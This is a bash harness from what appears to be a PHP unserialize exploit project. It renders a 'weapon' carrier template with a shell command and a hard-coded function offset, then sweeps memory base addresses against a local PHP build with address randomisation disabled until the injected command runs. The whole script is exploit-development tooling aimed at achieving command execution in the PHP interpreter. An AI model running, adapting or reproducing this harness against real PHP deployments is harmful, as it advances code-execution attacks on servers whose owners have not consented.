#!/bin/bash
# Wide fine sweep for the weapon-rendered zero4 (vdR3) carrier.
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
W=/tmp/dbg_zero4
rm -rf $W; mkdir -p $W
python3 - "$W" <<'PYEOF'
import sys
w = sys.argv[1]
import importlib.util
spec = importlib.util.spec_from_file_location("pw", "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)
s = pw.ZERO4_CARRIER.replace("__MARKER__", "/tmp/.p2s_pwn")
s = s.replace("__CMDFILE__", "/tmp/.p2s_cmd")
s = s.replace("__CMD__", "(id) > /tmp/.p2s_pwn 2>&1").replace("__CMDTEXT__", "sh /tmp/.p2s_cmd")
s = s.replace("__ZIFOFF__", str(0x523c60))
open(w + "/vdR3_call.php", "w").write(s)
print("rendered ok")
PYEOF
cd $W
BASEDEC=0093824990838784
for off in a0000 a4000 a8000 ac000 b0000 b4000 b8000 bc000 c0000 c4000 c8000 cc000 d0000 d4000 d8000; do
  base=$((0x7ffff5400000 + 0x$off))
  dec=$(printf "%016d" $base)
  rm -f /tmp/.p2s_pwn /tmp/.p2s_cmd
  timeout 30 setarch x86_64 -R $PHP -n vdR3_call.php "$dec" "$BASEDEC" >/dev/null 2>&1
  rc=$?
  if [ -f /tmp/.p2s_pwn ]; then echo "HIT +0x$off rc=$rc :: $(cat /tmp/.p2s_pwn | head -2)"; exit 0; fi
  echo "+0x$off rc=$rc"
done
echo no-hit
